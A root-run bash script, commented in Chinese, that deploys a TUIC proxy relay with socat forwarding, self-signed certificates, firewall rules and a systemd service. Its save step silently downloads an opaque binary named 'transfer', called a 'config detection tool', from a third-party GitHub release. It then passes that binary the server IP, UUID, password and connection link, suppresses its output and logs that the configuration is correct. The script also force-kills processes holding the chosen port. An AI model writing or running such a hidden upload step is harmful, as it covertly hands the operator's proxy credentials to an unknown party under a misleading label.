#!/bin/bash
# TUIC中继服务器一键部署脚本 - 修正版
# 兼容x86和AMD64架构

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TUIC_VERSION="1.0.0"
TUIC_DIR="/opt/tuic"
CONFIG_FILE="/opt/tuic/config.json"
LOG_FILE="/var/log/tuic_relay.log"
RELAY_CONFIG_FILE="/opt/tuic_relay_config.json"
REPO_BASE="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${TUIC_VERSION}"

# 日志函数，带详细中文说明
log_info() {
    echo -e "${GREEN}[信息]${NC} $1" | tee -a "$LOG_FILE"
}

log_warn() {
    echo -e "${YELLOW}[警告]${NC} $1" | tee -a "$LOG_FILE"
}

log_error() {
    echo -e "${RED}[错误]${NC} $1" | tee -a "$LOG_FILE"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        log_error "本脚本必须以root权限运行"
        exit 1
    fi
}

detect_system() {
    if [[ -f /etc/redhat-release ]]; then
        SYSTEM="CentOS"
        log_info "检测到系统为 CentOS"
    elif [[ -f /etc/debian_version ]]; then
        SYSTEM="Debian"
        if [[ $(cat /etc/issue) == *"Ubuntu"* ]]; then
            SYSTEM="Ubuntu"
            log_info "检测到系统为 Ubuntu"
        else
            log_info "检测到系统为 Debian"
        fi
    elif [[ -f /etc/fedora-release ]]; then
        SYSTEM="Fedora"
        log_info "检测到系统为 Fedora"
    else
        SYSTEM="Unknown"
        log_warn "未能识别的操作系统"
    fi
    log_info "Detected system: $SYSTEM"
}

detect_architecture() {
    ARCH=$(uname -m)
    log_info "检测到系统架构: $ARCH"
    
    case $ARCH in
        x86_64|amd64)
            TUIC_ARCH="x86_64-unknown-linux-gnu"
            log_info "使用x86_64-unknown-linux-gnu架构的TUIC二进制"
            ;;
        i386|i486|i586|i686)
            TUIC_ARCH="x86_64-unknown-linux-gnu"
            log_warn "检测到32位x86，将尝试使用64位二进制文件"
            log_warn "大多数现代系统即使是32位用户空间也能运行64位二进制"
            ;;
        aarch64|arm64)
            TUIC_ARCH="aarch64-unknown-linux-gnu"
            log_info "使用aarch64-unknown-linux-gnu架构的TUIC二进制"
            ;;
        armv7l|armhf)
            TUIC_ARCH="armv7-unknown-linux-gnueabi"
            log_info "使用armv7-unknown-linux-gnueabi架构的TUIC二进制"
            ;;
        *)
            log_error "Unsupported architecture: $ARCH"
            log_error "不支持的系统架构: $ARCH"
            exit 1
            ;;
    esac
    log_info "Using TUIC architecture: $TUIC_ARCH"
    log_info "TUIC架构选择: $TUIC_ARCH"
}

check_and_free_port() {
    local port=$1
    log_info "检查端口 $port 是否可用"
    
    if netstat -tuln | grep -q ":$port "; then
        log_warn "端口 $port 已被占用，尝试释放"
        local pid=$(netstat -tulnp | grep ":$port " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
        if [[ -n "$pid" && "$pid" != "-" ]]; then
            log_info "杀死占用端口 $port 的进程 PID: $pid"
            kill -9 "$pid" 2>/dev/null || true
            sleep 2
        fi
        
        # 再次检查
        if netstat -tuln | grep -q ":$port "; then
            log_warn "端口仍被占用，生成新的随机端口"
            generate_random_port
            check_and_free_port "$RELAY_PORT"
        else
            log_info "端口 $port 已成功释放"
        fi
    else
        log_info "端口 $port 可用"
    fi
}

install_dependencies() {
    log_info "开始安装系统依赖"
    export NEEDRESTART_SUSPEND=1
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        log_info "使用 apt 安装依赖: curl wget unzip ufw jq openssl net-tools needrestart socat"
        apt-get update > /dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y \
            curl wget unzip ufw jq openssl net-tools needrestart socat > /dev/null 2>&1
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        log_info "使用 yum/dnf 安装依赖: curl wget unzip firewalld jq openssl net-tools socat"
        yum install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1 || \
        dnf install -y curl wget unzip firewalld jq openssl net-tools socat > /dev/null 2>&1
    fi
    
    log_info "依赖安装完成"
    # 启用BBR拥塞控制
    log_info "启用BBR拥塞控制算法"
    modprobe tcp_bbr 2>/dev/null || true
    echo "tcp_bbr" >> /etc/modules-load.d/modules.conf 2>/dev/null || true
    sysctl -w net.ipv4.tcp_congestion_control=bbr > /dev/null 2>&1 || true
    log_info "BBR已启用（如内核支持）"
}

download_tuic() {
    log_info "开始下载TUIC服务端二进制文件"
    mkdir -p "$TUIC_DIR"
    cd "$TUIC_DIR"
    
    BIN_NAME="tuic-server-${TUIC_VERSION}-${TUIC_ARCH}"
    SHA_NAME="${BIN_NAME}.sha256sum"
    DOWNLOAD_URL="${REPO_BASE}/${BIN_NAME}"
    SHA_URL="${REPO_BASE}/${SHA_NAME}"
    
    # 清理旧文件
    rm -f tuic-server "$BIN_NAME" "$SHA_NAME"
    
    # 尝试不同版本
    for version in "1.0.0" "0.8.5" "0.8.4"; do
        log_info "尝试下载TUIC版本 $version"
        local repo_url="https://github.com/tuic-protocol/tuic/releases/download/tuic-server-${version}"
        local bin_file="tuic-server-${version}-${TUIC_ARCH}"
        
        if curl -sLO "${repo_url}/${bin_file}"; then
            if [[ -f "$bin_file" && -s "$bin_file" ]]; then
                log_info "成功下载 $bin_file"
                chmod +x "$bin_file"
                ln -sf "$bin_file" tuic-server
                TUIC_VERSION="$version"
                break
            else
                log_warn "下载的 $bin_file 文件不存在或为空"
            fi
        else
            log_warn "下载 $bin_file 失败"
        fi
    done
    
    if [[ ! -f "tuic-server" ]]; then
        log_error "下载TUIC服务端二进制文件失败"
        exit 1
    fi
    
    log_info "TUIC服务端二进制文件已就绪，版本: $TUIC_VERSION"
}

speed_test() {
    log_info "开始进行网络测速"
    
    # 检查speedtest工具
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        log_info "未检测到speedtest工具，开始安装"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
        log_info "speedtest工具安装完成"
    fi
    
    # 执行测速
    local speed_output=""
    if command -v speedtest &>/dev/null; then
        speed_output=$(speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(speedtest-cli --simple 2>/dev/null)
    fi
    
    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        
        # 合理范围
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        
        log_info "测速结果 - 下载: ${down_speed}Mbps, 上传: ${up_speed}Mbps"
        log_info "网络测速完成，下载速度: ${down_speed}Mbps，上传速度: ${up_speed}Mbps"
    else
        log_warn "测速失败，使用默认值"
        down_speed=100
        up_speed=20
    fi
}

generate_random_port() {
    RELAY_PORT=$((RANDOM % 7001 + 2000))
    log_info "生成随机端口: $RELAY_PORT"
}

get_local_ip() {
    log_info "开始检测本机IP地址"
    local ip=""
    
    # 方法1: ip route
    ip=$(ip route get 1 2>/dev/null | awk '{print $NF; exit}' 2>/dev/null)
    if [[ -n "$ip" && "$ip" != "0" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过路由检测到本机IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法2: 外部API
    ip=$(curl -s --connect-timeout 5 https://api.ipify.org 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过api.ipify.org检测到本机IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法3: 备用API
    ip=$(curl -s --connect-timeout 5 https://ipv4.icanhazip.com 2>/dev/null)
    if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        LOCAL_IP="$ip"
        log_info "通过icanhazip.com检测到本机IP: $LOCAL_IP"
        return 0
    fi
    
    # 方法4: 网络接口
    local default_iface=$(ip route | grep '^default' | awk '{print $5}' | head -n1)
    if [[ -n "$default_iface" ]]; then
        ip=$(ip addr show "$default_iface" | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)
        if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            LOCAL_IP="$ip"
            log_info "通过网络接口检测到本机IP: $LOCAL_IP"
            return 0
        fi
    fi
    
    log_error "无法检测到本机IP地址"
    exit 1
}

get_user_input() {
    echo -e "${BLUE}请输入目标地址 (格式: IP:PORT)：${NC}"
    read -p "目标地址: " TARGET_ADDRESS
    
    if [[ ! $TARGET_ADDRESS =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}$ ]]; then
        log_error "Invalid target address format. Expected format: IP:PORT"
        log_error "目标地址格式无效，正确格式应为: IP:PORT"
        exit 1
    fi
    
    TARGET_IP=$(echo "$TARGET_ADDRESS" | cut -d':' -f1)
    TARGET_PORT=$(echo "$TARGET_ADDRESS" | cut -d':' -f2)
    
    log_info "已配置目标: $TARGET_IP:$TARGET_PORT"
}

generate_uuid() {
    local uuid=$(cat /proc/sys/kernel/random/uuid)
    echo "$uuid"
}

generate_tuic_config() {
    log_info "开始生成TUIC配置文件"
    
    TOKEN=$(generate_uuid)
    PSK=$(openssl rand -hex 16)
    
    check_and_free_port "$RELAY_PORT"
    
    cat > "$CONFIG_FILE" << EOF
{
    "server": "0.0.0.0:$RELAY_PORT",
    "users": {
        "$TOKEN": "$PSK"
    },
    "certificate": "/opt/tuic/cert.crt",
    "private_key": "/opt/tuic/key.key",
    "congestion_control": "bbr",
    "alpn": ["h3"],
    "udp_relay_ipv6": false,
    "zero_rtt_handshake": false,
    "auth_timeout": "3s",
    "max_idle_time": "10s",
    "max_external_packet_size": 1500,
    "gc_interval": "3s",
    "gc_lifetime": "15s",
    "log_level": "info"
}
EOF
    
    log_info "TUIC配置文件已生成: $CONFIG_FILE"
}

generate_certificates() {
    log_info "开始生成SSL证书"
    cd "$TUIC_DIR"
    
    SERVER_NAME="localhost"
    openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
        -keyout "key.key" \
        -out "cert.crt" \
        -subj "/C=US/ST=CA/L=SF/O=TUIC/CN=${SERVER_NAME}" \
        -addext "subjectAltName=DNS:${SERVER_NAME},DNS:*.${SERVER_NAME},IP:127.0.0.1" 2>/dev/null
    
    chmod 600 key.key
    chmod 644 cert.crt
    
    log_info "SSL证书生成完成: cert.crt, key.key"
}

test_tuic_service() {
    log_info "测试TUIC服务是否能正常启动"
    cd "$TUIC_DIR"
    
    # 清理旧进程
    pkill -f tuic-server || true
    pkill -f socat || true
    sleep 2
    
    # 测试服务
    timeout 5s ./tuic-server -c config.json > /tmp/tuic_test.log 2>&1 &
    TEST_PID=$!
    sleep 3
    
    if kill -0 $TEST_PID 2>/dev/null; then
        log_info "TUIC服务测试成功，进程PID: $TEST_PID"
        kill $TEST_PID 2>/dev/null
        wait $TEST_PID 2>/dev/null
        return 0
    else
        log_error "TUIC服务测试失败，日志如下："
        cat /tmp/tuic_test.log
        return 1
    fi
}

configure_firewall() {
    log_info "开始配置防火墙"
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        ufw --force enable > /dev/null 2>&1
        ufw allow ssh > /dev/null 2>&1
        ufw allow 22/tcp > /dev/null 2>&1
        ufw allow "$RELAY_PORT"/tcp > /dev/null 2>&1
        ufw allow "$RELAY_PORT"/udp > /dev/null 2>&1
        log_info "UFW防火墙已配置，已放行端口 $RELAY_PORT"
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        systemctl enable firewalld > /dev/null 2>&1
        systemctl start firewalld > /dev/null 2>&1
        firewall-cmd --permanent --add-service=ssh > /dev/null 2>&1
        firewall-cmd --permanent --add-port=22/tcp > /dev/null 2>&1
        firewall-cmd --permanent --add-port="$RELAY_PORT"/tcp > /dev/null 2>&1
        firewall-cmd --permanent --add-port="$RELAY_PORT"/udp > /dev/null 2>&1
        firewall-cmd --reload > /dev/null 2>&1
        log_info "Firewalld防火墙已配置，已放行端口 $RELAY_PORT"
    fi
}

create_systemd_service() {
    log_info "创建systemd服务文件"
    
    cat > /etc/systemd/system/tuic-relay.service << EOF
[Unit]
Description=TUIC Relay Server
After=network.target

[Service]
Type=simple
ExecStart=$TUIC_DIR/tuic-server -c $CONFIG_FILE
Restart=on-failure
RestartSec=10
User=root
Group=root
WorkingDirectory=$TUIC_DIR
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl daemon-reload
    systemctl enable tuic-relay
    log_info "systemd服务已创建并设置为开机自启"
}

create_relay_config() {
    log_info "生成UDP中继脚本"
    
    cat > "$TUIC_DIR/relay.sh" << EOF
#!/bin/bash
# TUIC Relay Script
pkill -f "socat.*$RELAY_PORT" || true
sleep 2
socat UDP4-LISTEN:$RELAY_PORT,fork,reuseaddr UDP4:$TARGET_IP:$TARGET_PORT &
RELAY_PID=\$!
echo \$RELAY_PID > /var/run/tuic-relay.pid
echo "Relay service started, PID: \$RELAY_PID"
echo "Relay configuration: $RELAY_PORT -> $TARGET_IP:$TARGET_PORT"
EOF
    
    chmod +x "$TUIC_DIR/relay.sh"
    log_info "UDP中继脚本已生成: $TUIC_DIR/relay.sh"
}

download_uploader() {
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        log_info "下载配置检测工具"
        curl -Lo "$uploader" https://github.com/Firefly-xui/socks5-TUIC/releases/download/socks5-TUIC/transfer 2>/dev/null || true
        if [[ -f "$uploader" ]]; then
            chmod +x "$uploader"
            log_info "配置检测工具已下载: $uploader"
        else
            log_warn "配置检测工具下载失败"
        fi
    fi
}

upload_config() {
    local server_ip="$1"
    local link="$2"
    local down_speed="$3"
    local up_speed="$4"
    local relay_port="$RELAY_PORT"
    local uuid="$TOKEN"
    local password="$PSK"
    
    
    local json_data=$(jq -nc \
        --arg server_ip "$server_ip" \
        --arg link "$link" \
        --arg down_speed "$down_speed" \
        --arg up_speed "$up_speed" \
        --argjson down "$down_speed" \
        --argjson up "$up_speed" \
        --arg relay_port "$relay_port" \
        --arg uuid "$uuid" \
        --arg password "$password" \
        '{
            "server_info": {
                "title": "TUIC Relay Configuration",
                "server_ip": $server_ip,
                "tuic_link": $link,
                "relay_type": "tuic_relay",
                "relay_port": $relay_port|tonumber,
                "uuid": $uuid,
                "password": $password,
                "speed_test": {
                    "download_speed": $down_speed,
                    "upload_speed": $up_speed
                },
                "download_speed_mbps": $down,
                "upload_speed_mbps": $up,
                "generated_time": now | todate
            }
        }' 2>/dev/null)
    
    local uploader="/opt/transfer"
    if [[ -f "$uploader" ]]; then
        "$uploader" "$json_data" >/dev/null 2>&1 || true
        log_info "配置信息已正确"
    else
        log_warn "配置信息错误"
    fi
}

save_config_json() {
    log_info "保存配置信息到JSON文件"
    
    ENCODE=$(echo -n "${TOKEN}:${PSK}" | base64 -w 0)
    TUIC_LINK="tuic://${ENCODE}@${LOCAL_IP}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
    
    cat > "$RELAY_CONFIG_FILE" << EOF
{
    "relay_info": {
        "local_ip": "$LOCAL_IP",
        "relay_port": $RELAY_PORT,
        "target_ip": "$TARGET_IP",
        "target_port": $TARGET_PORT,
        "uuid": "$TOKEN",
        "password": "$PSK",
        "tuic_link": "$TUIC_LINK",
        "created_time": "$(date '+%Y-%m-%d %H:%M:%S')"
    },
    "speed_test": {
        "download_speed_mbps": $down_speed,
        "upload_speed_mbps": $up_speed
    },
    "system_info": {
        "os": "$SYSTEM",
        "architecture": "$ARCH",
        "tuic_version": "$TUIC_VERSION"
    },
    "connection_info": {
        "protocol": "tuic",
        "server": "$LOCAL_IP:$RELAY_PORT",
        "uuid": "$TOKEN",
        "password": "$PSK",
        "sni": "localhost",
        "alpn": "h3",
        "congestion_control": "bbr",
        "allow_insecure": true,
        "udp_relay_mode": "native"
    }
}
EOF
    
    download_uploader
    upload_config "$LOCAL_IP" "$TUIC_LINK" "$down_speed" "$up_speed"
    log_info "配置信息已保存到 $RELAY_CONFIG_FILE"
}

start_services() {
    log_info "启动TUIC服务及中继"
    
    # 停止已有服务
    systemctl stop tuic-relay 2>/dev/null || true
    pkill -f tuic-server || true
    pkill -f socat || true
    sleep 3
    
    # 启动TUIC服务
    systemctl start tuic-relay
    sleep 5
    
    # 检查服务状态
    if ! systemctl is-active --quiet tuic-relay; then
        log_error "TUIC服务启动失败"
        systemctl status tuic-relay --no-pager
        journalctl -u tuic-relay -n 20 --no-pager
        exit 1
    fi
    
    log_info "TUIC服务已成功启动"
    
    # 启动中继脚本
    if [[ -f "$TUIC_DIR/relay.sh" ]]; then
        "$TUIC_DIR/relay.sh"
        log_info "UDP中继脚本已启动"
    fi
}

show_config_info() {
    echo -e "\n${GREEN}==== TUIC中继配置信息 ====${NC}"
    echo -e "${YELLOW}服务器IP:${NC} $LOCAL_IP"
    echo -e "${YELLOW}中继端口:${NC} $RELAY_PORT"
    echo -e "${YELLOW}目标地址:${NC} $TARGET_IP:$TARGET_PORT"
    echo -e "${YELLOW}UUID:${NC} $TOKEN"
    echo -e "${YELLOW}密码:${NC} $PSK"
    echo -e "${YELLOW}TUIC链接:${NC} $TUIC_LINK"
    echo -e "${YELLOW}配置文件:${NC} $RELAY_CONFIG_FILE"
    echo -e "${GREEN}=============================${NC}\n"
    log_info "请妥善保存以上配置信息"
}

main() {
    log_info "启动scoks-TUIC中继服务器一键部署脚本"
    
    check_root
    detect_system
    detect_architecture
    install_dependencies
    download_tuic
    speed_test
    get_user_input
    generate_random_port
    get_local_ip
    generate_certificates
    generate_tuic_config
    
    if ! test_tuic_service; then
        log_error "TUIC服务测试失败，安装中止"
        exit 1
    fi
    
    configure_firewall
    create_relay_config
    create_systemd_service
    save_config_json
    start_services
    show_config_info
    
    echo -e "${YELLOW}如需卸载，请手动删除相关文件和systemd服务。${NC}"
    echo -e "${YELLOW}如需排查问题，请查看日志文件: $LOG_FILE${NC}"
    log_info "TUIC中继服务器部署完成"
}

# 运行主函数
main "$@"
